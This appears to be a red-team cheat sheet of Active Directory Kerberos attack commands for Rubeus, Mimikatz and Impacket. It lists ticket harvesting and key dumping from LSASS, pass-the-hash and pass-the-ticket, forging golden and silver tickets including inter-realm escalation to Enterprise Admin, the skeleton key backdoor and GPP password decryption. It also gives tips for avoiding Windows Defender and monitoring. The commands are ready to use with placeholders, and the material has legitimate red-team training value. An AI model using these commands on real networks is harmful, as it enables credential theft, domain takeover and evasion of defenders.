### Ticket Conversion
- converting tickets between impacket and mimikatz/rubeus format
```
kirbi2ccache <KIRBI_FILE> <CCACHE_FILE>
```
```
ccache2kirbi <CCACHE_FILE> <KIRBI_FILE>
```
```
impacket-ticketConverter <CCACHE/KIRBI_FILE> <KIRBI/CCACHE_FILE>
KIRBI -> MIMIKATZ
CCACHE -> IMPACKET
```
### Request New initial TGT
- Requires user's password or hash
- Rubeus
```
rubeus asktgt /domain: /user: /password: /enctype:<RC4|AES128|AES256|3DES>
```
```
#Use aes256 default for enctype
#If you don't have a password but have a hash, replace /password: with /rc4: /aes128: /aes256: or /des:
```
- Mimikatz
```
tgt::ask /domain: /user: /password:
```
- Impacket (remote)
```
impacket-getTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -hashes <HASH> export KRB5CCNAME=<TICKET>.ccache
```
### Request Delegated TGT
- Can't change passwords with delegated TGTs but can request TGSes
- domain controllers by default can provide delegated TGTs
- Normal for some processes like explorer but weird for others likenotepad
- for processes where it's weird you don't want to get flagged by windows defender so be sure to use the /host during impacket scripts without knowing the password and convert the ticket to ccache
- Rubeus
```
rubeus tgtdeleg
```
```
/target:<SPN>
```
- Mimikatz
```
#Contacts domain controller by default
tgt::deleg
```
```
#Have another host delegate for you for stealth
/host:<FQDN>
#Find with Get-AdComputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
### Request TGS
- Rubeus
```
rubeus asktgs /service:<SPN>/<FQDN>
```
```
#To impersonate another user (same as request TGT):
/enctype:
/user: <USERNAME>
/password: <PASSWORD>
#If you don't have a password but have a hash replace /password: withg /rc4: /aes128: /aes256: /des:
```
- Mimikatz
```
kerberos::ask /target:<SPN>/<FQDN>
optional /export to export
```
- Impacket (remote)
```
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn <SERVICE>/<HOST>
-dc-ip <DC_IP>
-hashes <HASH>
-impersonate <USER>
Note: Automatically modifies impersonate TGS so it can be used with other impacket tools
```
### Modify Existing TGS for Another Service
- Rubeus
```
rubeus asktgs /altservice:<SPN> /ticket:<TICKET>
/ptt will automatically load onto current logon session
```
### Harvesting Tickets
#### Rubeus
- List current session TGT
```
rubeus harvest /interval:30
```
- List current session all tickets with logon id and expiration time
```
rubeus triage
```
- List current session tickets with detailed info
```
rubeus dump
/user:<USER> for a specific user
/service:<SERVICE> for a specific service
/luid:<LOGON_ID> for specific session if we have access to all sesssions (admin)
/nowrap for easier copy and paste
```
#### Mimikatz
- List current session TGT
```
kerberos::tgt
```
- List current session all tickets
```
kerberos::list
```
- List all tickets for all sessions but injects into LSASS memory so don't do it if there's a monitoring service
```
sekurlsa::tickets
```
```
Add /export to any of these to export but first base64 /out:true and base64 /in:true to export base64 encoded (less likely to be detected)
```
### Harvest Keys
#### Mimikatz
```
sekurlsa::ekeys
```
#### Purge Tickets
- Rubeus
```
rubeus purge
```
- Mimikatz
```
kerberos::purge
```
### Pass the key (PTK)/Overpass the hash (OPTH)
- Pass the key or pass the hash to obtain a TGT
#### Rubeus
```
rubeus asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
```
#### Mimikatz
```
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /rc4:<HASH> /run:<CMD.EXE_OR_POWERSHELL.EXE>
```
#### Impacket (remote)
```
impacket-GetTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -hashes <HASHES> export KRB5CCNAME=<TICKET>.ccache
```
### Pass the ticket (PTT)
- Can either pass the TGT or pass the TGS
- Dump the ticket to be passed (see harvest tickets above)
	- for mimikatz export the tickets with sekurlsa::tickets /export
#### Rubeus
```
rubeus ptt /ticket:<TICKET>
```
#### Mimikatz
```
kerberos::ptt <TICKET>
#Verify with klist to list the cached tickets
```
#### Impacket
```
export KRB5CCNAME=<TICKET>.ccache
```
### Golden/Silver Ticket
- golden ticket
	- Create forged TGT for domain admin using admin's hash
- Silver Ticket
	- Create forged TGS for service using service's hash 
		- this is useful for impersonating users when logging into a service
		- Has the same effect as requesting a TGT or TGS but without communicating with the DC
		- You can create it for any user, even one that doesn't exist
#### Mimikatz
- Get domain SID
```
wmic useraccount get name,sid
```
- Current realm
```
kerberos::golden /user:<ANYTHING> /id:<ANYTHING> /domain: /sid:<DC_SID> /krbtgt: <NTLM_HASH> /ptt
```
```
# use /service:<SPN> for a silver ticket
```
- Inter-Realm
```
kerberos::golden /user:<ANYTHING> /id:<ANYTHING> /domain:<DOMAIN> /sid:<CHILD_DC_SID> /krbtgt:<NTLM_HASH> /service:krbtgt /sids:<ENTERPRISE_ADMIN_GROUP_SID>
```
#### Impacket
- Get domain SID
```
impacket-getPac -targetUser Administrator <DOMAIN>/<USER>:<PASSWORD>
```
```
crackmapexec ldap <DC> -u <USER> -p <PASSWORD> -k --get-sid
```
- current realm
```
impacket-ticketer -domain <DOMAIN> -domain-sid <SID> -nthash <KRBTGT_HASH> Administrator
```
```
#For another user replace Administrator with -user-id <ID> <USER>
# use -spn <SPN> for silver ticket
export KRB5CCNAME=<TICKET>.ccache
```
- Inter-Realm
- Manual
```
impacket-ticketer -domain <DOMAIN> -domain-sid <SID> -nthash <KRBTGT_HASH> -spn krbtgt -extra-sid <ENTERPRISE_ADMIN_GROUP_SID> export KRB5CCNAME=<TICKET>.ccache
```
- Automatically
```
impacket-raiseChild <DOMAIN>/<USER>:<PASSWORD> -w <TICKET> -target-exec <HOST>
```
```
#-w writes out the golden ticket
#-target-exec <HOST> ps exec to host after compromise
```
### Skeletonkey
- Used to access any SMB share with the same password
```
misc::skeleton
```
- Default password is mimikatz
### Group Policy Preferences (GPP)
- Patched in MS14-025
- Locally
```
C:\Windows\SYSVOL\Preferences\Groups\Groups.xml
```
- On a domain controller copy the cpassword from cpassword annotation
```
gpp-decrypt <CPASSWORD>
```
- Impacket
```
impacket-Get-GPPPassword <DOMAIN>/<USER>:<PASSWORD>@<DC> -xmlfile <GROUPS.SML_FILE> local # parses local xml file
```